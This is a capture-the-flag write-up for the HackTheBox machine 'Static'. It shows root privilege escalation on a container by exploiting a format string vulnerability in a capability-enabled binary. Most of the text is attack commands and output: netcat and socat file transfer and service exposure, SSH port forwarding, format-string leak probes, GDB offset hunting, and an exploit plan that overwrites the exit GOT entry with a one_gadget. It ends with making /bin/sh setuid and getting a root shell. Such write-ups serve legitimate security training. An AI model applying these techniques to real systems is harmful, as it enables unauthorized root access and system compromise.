##  Exploit format string vulnerability to root

Machine static(10.10.10.246) have two docker containers whose hostnames are web and pki.

Suppose we can ssh in web and have a reverse shell in pki.

Let's see how to root pki. 

### IP and open port:

```shell
static: 10.10.10.246; port 22,2222,8080 open
web: 172.20.0.10, 192.168.254.2; port 80,22 open
pki: 192.168.254.2; port 80,9000 open
```

```shell
â”Œâ”€â”€(rootðŸ’€kali)-[/HTB/static.htb]
â””â”€# ssh -i id_rsa -p 2222 www-data@10.10.10.246
# Now we are in web.
www-data@web:~$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
# web has wget without nc,curl
```

### Check ersatool

```shell
www-data@pki:~/html$ cat index.php
<?php
header('X-Powered-By: PHP-FPM/7.1');
//cn needs to be parsed!!!
$cn=preg_replace("/[^A-Za-z0-9 ]/", '',$_GET['cn']);
echo passthru("/usr/bin/ersatool create ".$cn);
?>

www-data@pki:~/html$ ls -l /usr/bin/ersatool
ls -al /usr/bin/ersatool
-rwxr-xr-x 1 root root 22496 ...... /usr/bin/ersatool

www-data@pki:~/html$ getcap /usr/bin/ersatool
/usr/bin/ersatool = cap_setuid+eip

www-data@pki:~/html$ ldd /usr/bin/ersatool
ldd /usr/bin/ersatool
	linux-vdso.so.1 (0x00007ffc9fbeb000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f0099dcf000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f009a1c0000)
	
www-data@pki:~/html$ ls -l /lib64/ld-linux-x86-64.so.2
lrwxrwxrwx 1 root root 32 ...... /lib64/ld-linux-x86-64.so.2 -> /lib/x86_64-linux-gnu/ld-2.27.so

www-data@pki:~/html$ ls -l /lib/x86_64-linux-gnu/libc.so.6
lrwxrwxrwx 1 root root 12 ...... /lib/x86_64-linux-gnu/libc.so.6 -> libc-2.27.so
# pki has no curl,nc,wget
# python3 is installed on web and pki.
```

### Transfer files

```shell
# transfer nc,socat,pspy64s from kali to web
â”Œâ”€â”€(rootðŸ’€kali)-[/HTB/static.htb]
â””â”€# scp -i id_rsa -P 2222 /HTB/static.htb/nc www-data@10.10.10.246:/tmp
â”Œâ”€â”€(rootðŸ’€kali)-[/HTB/static.htb]
â””â”€# scp -i id_rsa -P 2222 /HTB/static.htb/socat www-data@10.10.10.246:/tmp
â”Œâ”€â”€(rootðŸ’€kali)-[/HTB/static.htb]
â””â”€# scp -i id_rsa -P 2222 /HTB/static.htb/pspy64s www-data@10.10.10.246:/tmp

# create an HTTP server in web to transfer nc,socat,pspy64s
www-data@web:/tmp$ python3 -m http.server 3333
# download nc,socat,pspy64s from web
www-data@pki:~$ cat > tran.py <<EOF
import urllib.request
url = 'http://192.168.254.2:3333/nc'
urllib.request.urlretrieve(url, "nc")
url = 'http://192.168.254.2:3333/socat'
urllib.request.urlretrieve(url, "socat")
url = 'http://192.168.254.2:3333/pspy64s'
urllib.request.urlretrieve(url, "pspy64s")
EOF

www-data@pki:~$ python3 tran.py
# then use nc transfer /usr/bin/ersatool,/lib/x86_64-linux-gnu/libc.so.6,/lib/x86_64-linux-gnu/ld-2.27.so from pki to web then scp these files to kali. 
www-data@web:/tmp$ ./nc -lvnp 3333 > ersatool
www-data@pki:/tmp$ ./nc 192.168.254.2 3333 < /usr/bin/ersatool
www-data@web:/tmp$ ./nc -lvnp 3333 > libc.so.6
www-data@pki:/tmp$ ./nc 192.168.254.2 3333 < /lib/x86_64-linux-gnu/libc.so.6
www-data@web:/tmp$ ./nc -lvnp 3333 > ld-2.27.so
www-data@pki:/tmp$ ./nc 192.168.254.2 3333 < /lib/x86_64-linux-gnu/ld-2.27.so

â”Œâ”€â”€(rootðŸ’€kali)-[/HTB/static.htb]
â””â”€# scp -i id_rsa -P 2222 www-data@10.10.10.246:/tmp/ersatool /HTB/static.htb/ersatool
â”Œâ”€â”€(rootðŸ’€kali)-[/HTB/static.htb]
â””â”€# scp -i id_rsa -P 2222 www-data@10.10.10.246:/tmp/libc.so.6 /HTB/static.htb/libc.so.6
â”Œâ”€â”€(rootðŸ’€kali)-[/HTB/static.htb]
â””â”€# scp -i id_rsa -P 2222 www-data@10.10.10.246:/tmp/ld-2.27.so /HTB/static.htb/ld-2.27.so
â”Œâ”€â”€(rootðŸ’€kali)-[/HTB/static.htb]
â””â”€# patchelf --set-interpreter /HTB/static.htb/ld-2.27.so --set-rpath /HTB/static.htb ersatool
```

### IDA analysis

```c
// in function printCN
printf((const char *)&s, EXT);
// it is a format string vulnerability

// in  function createCN
if ( buf != 10 )
{
    do
    {
      v9 = vfork();
      if ( !v9 )
      {
        v4 = __xpg_basename((char *)&buf);
        v5 = strtok(v4, &delim);
        cleanStr((__int64)v5);
        sprintf(&command, "%s %s %.20s %s %s", s, "build-client-full", v5, "nopass", "batch");
        v11 = dup(1);
        v10 = dup(2);
        fd = open("/dev/null", 1);
        dup2(fd, 1);
        dup2(fd, 2);
        setuid(0);
        chdir(ERSA_DIR);
        system(&command);
        exit(0);
      }
      dup2(v11, 1);
      dup2(v10, 2);
      close(fd);
      usleep(0x7A120u);
      integrateCN((char *)&buf);
      if ( a2 == 1 )
      {
        printf("create->CN=", 2LL);
        fflush(stdout);
        memset(&buf, 0, 0x64uLL);
        read(0, &buf, 0x64uLL);
      }
      result = 10 - (unsigned int)buf;
    }
    while ( buf != 10 && a2 == 1 );
}
// use the part: setuid(0);chdir(ERSA_DIR);system(&command);exit(0); to root
```

### Run ersatool

```shell
â”Œâ”€â”€(rootðŸ’€kali)-[/HTB/static.htb]
â””â”€# ./ersatool
#
create|print|revoke|exit
# print
print->CN=AAAA%p. %p. %p. %p. %p. %p. %p. %p. %p. %p. %p. %p
AAAA0x557441d2315f. 0x6e. 0x70766f2e. 0x1d. 0x7ffe65085a50. 0x141d1f1d0. (nil). 0x202e702541414141. 0x202e7025202e7025. 0x202e7025202e7025. 0x202e7025202e7025. 0x202e7025202e7025[!] ERR reading /opt/easyrsa/clients/AAAA%p. %p. %p. %p. %p. %p. %p. %p. %p. %p. %p. %p.ovpn!
print->CN=BBBBAAAA%p. %p. %p. %p. %p. %p. %p. %p. %p. %p. %p. %p
BBBBAAAA0x557441d2315f. 0x6e. 0x70766f2e. 0x19. 0x7ffe65085a50. 0x141d1f1d0. (nil). 0x4141414142424242. 0x202e7025202e7025. 0x202e7025202e7025. 0x202e7025202e7025. 0x202e7025202e7025[!] ERR reading /opt/easyrsa/clients/BBBBAAAA%p. %p. %p. %p. %p. %p. %p. %p. %p. %p. %p. %p.ovpn!
print->CN=%8$pAAAABBBBCCCC
0x4141414170243825AAAABBBBCCCC[!] ERR reading /opt/easyrsa/clients/%8$pAAAABBBBCCCC.ovpn!
print->CN=%9$p----AAAABBBB                 
0x4242424241414141----AAAABBBB[!] ERR reading /opt/easyrsa/clients/%9$p----AAAABBBB.ovpn!
```

**Conclusion: %8$p will print format string itself.**

### GDB debug

```shell
â”Œâ”€â”€(rootðŸ’€kali)-[/HTB/static.htb]
â””â”€# pwn checksec ./ersatool
[*] '/HTB/static.htb/ersatool'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'/HTB/static.htb'

â”Œâ”€â”€(rootðŸ’€kali)-[/HTB/static.htb]
â””â”€# gdb ./ersatool
GNU gdb (Debian 10.1-2) 10.1.90.20210103-git
......
Reading symbols from ./ersatool...
(No debugging symbols found in ./ersatool)
pwndbg> set follow-fork-mode child
pwndbg> set detach-on-fork off
pwndbg> r
Starting program: /HTB/static.htb/ersatool 
# 
create|print|revoke|exit
# print
print->CN=^C
Program received signal SIGINT, Interrupt.
0x00007ffff7af4081 in read () from /HTB/static.htb/libc.so.6
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 RAX  0xfffffffffffffe00
 RBX  0x0
 RCX  0x7ffff7af4081 (read+17) â—‚â€” cmp    rax, -0x1000 /* 'H=' */
 RDX  0x64
 RDI  0x0
 RSI  0x7fffffffde70 â—‚â€” 0x0
 R8   0x7ffff7dd18c0 â—‚â€” 0x0
 R9   0x7ffff7ff5500 â—‚â€” 0x7ffff7ff5500
 R10  0x7ffff7b69e00 â—‚â€” pslldq xmm2, 7
 R11  0x246
 R12  0x5555555551d0 (_start) â—‚â€” xor    ebp, ebp
 R13  0x7fffffffe080 â—‚â€” 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdf60 â€”â–¸ 0x7fffffffdfa0 â€”â–¸ 0x555555556070 (__libc_csu_init) â—‚â€” push   r15
 RSP  0x7fffffffde58 â€”â–¸ 0x555555555329 (printCN+116) â—‚â€” jmp    0x555555555362
 RIP  0x7ffff7af4081 (read+17) â—‚â€” cmp    rax, -0x1000 /* 'H=' */
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 â–º 0x7ffff7af4081 <read+17>     cmp    rax, -0x1000
   0x7ffff7af4087 <read+23>     ja     read+112                <read+112>
    â†“
   0x7ffff7af40e0 <read+112>    mov    rdx, qword ptr [rip + 0x2dad81]
   0x7ffff7af40e7 <read+119>    neg    eax
   0x7ffff7af40e9 <read+121>    mov    dword ptr fs:[rdx], eax
   0x7ffff7af40ec <read+124>    mov    rax, -1
   0x7ffff7af40f3 <read+131>    ret    
 
   0x7ffff7af40f4 <read+132>    mov    rdx, qword ptr [rip + 0x2dad6d]
   0x7ffff7af40fb <read+139>    neg    eax
   0x7ffff7af40fd <read+141>    mov    dword ptr fs:[rdx], eax
   0x7ffff7af4100 <read+144>    mov    rax, -1
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
00:0000â”‚ rsp 0x7fffffffde58 â€”â–¸ 0x555555555329 (printCN+116) â—‚â€” jmp    0x555555555362
01:0008â”‚     0x7fffffffde60 â—‚â€” 0x1555551d0
02:0010â”‚     0x7fffffffde68 â—‚â€” 0x0
... â†“        5 skipped
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 â–º f 0   0x7ffff7af4081 read+17
   f 1   0x555555555329 printCN+116
   f 2   0x555555555f83 main+296
   f 3   0x7ffff7a05b97 __libc_start_main+231
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
pwndbg> p printf
$1 = {<text variable, no debug info>} 0x7ffff7a48e80 <printf>
pwndbg> b *0x7ffff7a48e80
Breakpoint 1 at 0x7ffff7a48e80
pwndbg> c
Continuing.
%9$p----AAAABBBB

Breakpoint 1, 0x00007ffff7a48e80 in printf () from /HTB/static.htb/libc.so.6
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
*RAX  0x0
*RBX  0x4f
*RCX  0x70766f2e
*RDX  0x6e
*RDI  0x7fffffffde70 â—‚â€” '%9$p----AAAABBBB'
*RSI  0x55555555915f (EXT) â—‚â€” 0x6e70766f2e /* '.ovpn' */
*R8   0x3f
*R9   0x7fffffffdee0 â—‚â€” '/opt/easyrsa/clients/%9$p----AAAABBBB.ovpn'
*R10  0x20
*R11  0x7ffff7b937f4 â—‚â€” sub    al, 0xae
 R12  0x5555555551d0 (_start) â—‚â€” xor    ebp, ebp
 R13  0x7fffffffe080 â—‚â€” 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdf60 â€”â–¸ 0x7fffffffdfa0 â€”â–¸ 0x555555556070 (__libc_csu_init) â—‚â€” push   r15
 RSP  0x7fffffffde58 â€”â–¸ 0x555555555446 (printCN+401) â—‚â€” lea    rax, [rbp - 0x80]
*RIP  0x7ffff7a48e80 (printf) â—‚â€” sub    rsp, 0xd8
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 â–º 0x7ffff7a48e80 <printf>        sub    rsp, 0xd8
   0x7ffff7a48e87 <printf+7>      test   al, al
   0x7ffff7a48e89 <printf+9>      mov    qword ptr [rsp + 0x28], rsi
   0x7ffff7a48e8e <printf+14>     mov    qword ptr [rsp + 0x30], rdx
   0x7ffff7a48e93 <printf+19>     mov    qword ptr [rsp + 0x38], rcx
   0x7ffff7a48e98 <printf+24>     mov    qword ptr [rsp + 0x40], r8
   0x7ffff7a48e9d <printf+29>     mov    qword ptr [rsp + 0x48], r9
   0x7ffff7a48ea2 <printf+34>     je     printf+91                <printf+91>
    â†“
   0x7ffff7a48edb <printf+91>     mov    rax, qword ptr fs:[0x28]
   0x7ffff7a48ee4 <printf+100>    mov    qword ptr [rsp + 0x18], rax
   0x7ffff7a48ee9 <printf+105>    xor    eax, eax
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
00:0000â”‚ rsp 0x7fffffffde58 â€”â–¸ 0x555555555446 (printCN+401) â—‚â€” lea    rax, [rbp - 0x80]
01:0008â”‚     0x7fffffffde60 â—‚â€” 0x1555551d0
02:0010â”‚     0x7fffffffde68 â—‚â€” 0x0
03:0018â”‚ rdi 0x7fffffffde70 â—‚â€” '%9$p----AAAABBBB'
04:0020â”‚     0x7fffffffde78 â—‚â€” 'AAAABBBB'
05:0028â”‚     0x7fffffffde80 â—‚â€” 0x0
... â†“        2 skipped
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 â–º f 0   0x7ffff7a48e80 printf
   f 1   0x555555555446 printCN+401
   f 2   0x555555555f83 main+296
   f 3   0x7ffff7a05b97 __libc_start_main+231
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
pwndbg> stack 50
00:0000â”‚ rsp 0x7fffffffde58 â€”â–¸ 0x555555555446 (printCN+401) â—‚â€” lea    rax, [rbp - 0x80]
01:0008â”‚     0x7fffffffde60 â—‚â€” 0x1555551d0
02:0010â”‚     0x7fffffffde68 â—‚â€” 0x0
03:0018â”‚ rdi 0x7fffffffde70 â—‚â€” '%9$p----AAAABBBB'
04:0020â”‚     0x7fffffffde78 â—‚â€” 'AAAABBBB'
05:0028â”‚     0x7fffffffde80 â—‚â€” 0x0
... â†“        9 skipped
0f:0078â”‚     0x7fffffffded0 â—‚â€” 0x555500000000
10:0080â”‚     0x7fffffffded8 â€”â–¸ 0x7ffff7a70f51 (_IO_do_write+177) â—‚â€” mov    rbp, rax
11:0088â”‚ r9  0x7fffffffdee0 â—‚â€” '/opt/easyrsa/clients/%9$p----AAAABBBB.ovpn'
12:0090â”‚     0x7fffffffdee8 â—‚â€” 'yrsa/clients/%9$p----AAAABBBB.ovpn'
13:0098â”‚     0x7fffffffdef0 â—‚â€” 'ents/%9$p----AAAABBBB.ovpn'
14:00a0â”‚     0x7fffffffdef8 â—‚â€” 'p----AAAABBBB.ovpn'
15:00a8â”‚     0x7fffffffdf00 â—‚â€” 'ABBBB.ovpn'
16:00b0â”‚     0x7fffffffdf08 â—‚â€” 0x6e70 /* 'pn' */
17:00b8â”‚     0x7fffffffdf10 â—‚â€” 0x0
... â†“        5 skipped
1d:00e8â”‚     0x7fffffffdf40 â—‚â€” 0x7fff00000000
1e:00f0â”‚     0x7fffffffdf48 â€”â–¸ 0x7ffff7a6287d (fflush+157) â—‚â€” xor    edx, edx
1f:00f8â”‚     0x7fffffffdf50 â—‚â€” 0x100000000
20:0100â”‚     0x7fffffffdf58 â—‚â€” 0x0
21:0108â”‚ rbp 0x7fffffffdf60 â€”â–¸ 0x7fffffffdfa0 â€”â–¸ 0x555555556070 (__libc_csu_init) â—‚â€” push   r15
22:0110â”‚     0x7fffffffdf68 â€”â–¸ 0x555555555f83 (main+296) â—‚â€” jmp    0x555555555fee
23:0118â”‚     0x7fffffffdf70 â€”â–¸ 0x7fffffffe088 â€”â–¸ 0x7fffffffe3ba â—‚â€” '/HTB/static.htb/ersatool'
24:0120â”‚     0x7fffffffdf78 â—‚â€” 0x100000000
25:0128â”‚     0x7fffffffdf80 â€”â–¸ 0x555555556070 (__libc_csu_init) â—‚â€” push   r15
26:0130â”‚     0x7fffffffdf88 â—‚â€” 0xa746e697270 /* 'print\n' */
27:0138â”‚     0x7fffffffdf90 â—‚â€” 0x0
28:0140â”‚     0x7fffffffdf98 â—‚â€” 0x100000000
29:0148â”‚     0x7fffffffdfa0 â€”â–¸ 0x555555556070 (__libc_csu_init) â—‚â€” push   r15
2a:0150â”‚     0x7fffffffdfa8 â€”â–¸ 0x7ffff7a05b97 (__libc_start_main+231) â—‚â€” mov    edi, eax
2b:0158â”‚     0x7fffffffdfb0 â—‚â€” 0x1
2c:0160â”‚     0x7fffffffdfb8 â€”â–¸ 0x7fffffffe088 â€”â–¸ 0x7fffffffe3ba â—‚â€” '/HTB/static.htb/ersatool'
2d:0168â”‚     0x7fffffffdfc0 â—‚â€” 0x100008000
2e:0170â”‚     0x7fffffffdfc8 â€”â–¸ 0x555555555e5b (main) â—‚â€” push   rbp
2f:0178â”‚     0x7fffffffdfd0 â—‚â€” 0x0
30:0180â”‚     0x7fffffffdfd8 â—‚â€” 0xf8c057f8600c48ca
31:0188â”‚     0x7fffffffdfe0 â€”â–¸ 0x5555555551d0 (_start) â—‚â€” xor    ebp, ebp

# note the line: 03:0018â”‚ rdi 0x7fffffffde70 â—‚â€” '%9$p----AAAABBBB'
# note the line: 2e:0170â”‚     0x7fffffffdfc8 â€”â–¸ 0x555555555e5b (main) â—‚â€” push   rbp
# 0x2e - 0x03 = 43
# main addr offset is 43 + 8 = 51, let's validate it!
pwndbg> c
Continuing.

print->CN=%51$p---

pwndbg> c
Continuing.
0x555555555e5b---[!] ERR reading /opt/easyrsa/clients/%51$p---.ovpn!
```

### Write exp.py

```
0. call printCN function
1. use '%51$p---' to get main address
2. use "'%9$s----' + elf.got['printf']" to get printf address
3. use "printf address - libc.symbols['printf']" to get libc base address
4. use "libc base address + elf.got['exit']" to get exit got address
5. use "one_gadget ./libc.so.6" to get some one_gadget addresses
6. use "libc base address + one of appropriate one_gadget addresses" to get one_gadget addr
7. use "one_gadget addr" override exit got address
8. call createCN function to root
```

### Steps to root

#### 1. socat exec ersatool in pki

```shell
www-data@pki:~$ ./socat tcp-listen:5555,reuseaddr,fork, exec:"/usr/bin/ersatool" &
```

#### 2. port forward in web

```shell
www-data@web:~$ ssh -L 4444:192.168.254.3:5555 -p 2222 -i id_rsa www-data@static.htb
```

#### 3. run exp.py in kali

```shell
â”Œâ”€â”€(rootðŸ’€kali)-[/HTB/static.htb]
â””â”€# python3 exp.py REMOTE
[+] Opening connection to 127.0.0.1 on port 4444: Done
[*] '/HTB/static.htb/ersatool'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'/HTB/static.htb'
[+] main addr: 0x56157bb2f000
[+] printf_got: 0x56157bb34058
[+] libc_base addr: 0x7fa9fcd44000
[+] exit_got addr: 0x56157bb340c0
[+] one_gadget addr: 0x7fa9fce4e38c
[*] Switching to interactive mode
client
dev tun9
...junk data...
ea5f5af8329f367f112599f3e668bd7a
-----END OpenVPN Static key V1-----
</tls-auth>
create->CN=$ chmod u+s /bin/sh
$ chmod u+s /bin/sh
$ 
......
```

### Pki rooted

```shell
www-data@pki:~$ ls -l /bin/sh    
lrwxrwxrwx 1 root root ... /bin/sh -> dash
www-data@pki:~$ ls -l /bin/dash
-rwsr-xr-x 1 root root ... /bin/dash
www-data@pki:~$ sh -p
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
# cat /etc/nginx/sites-available/default
server {
    listen 80 default_server;
    listen [::]:80 default_server;

    root /var/www/html;

    index index.html index.php;

    server_name _;

    location ~ [^/]\.php(/|$) {
        fastcgi_split_path_info ^(.+?\.php)(/.*)$;

        include fastcgi_params;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        fastcgi_param PATH_INFO       $fastcgi_path_info;
        fastcgi_param PATH_TRANSLATED $document_root$fastcgi_path_info;

        fastcgi_pass   127.0.0.1:9000;
        fastcgi_index  index.php;
    }
}
```
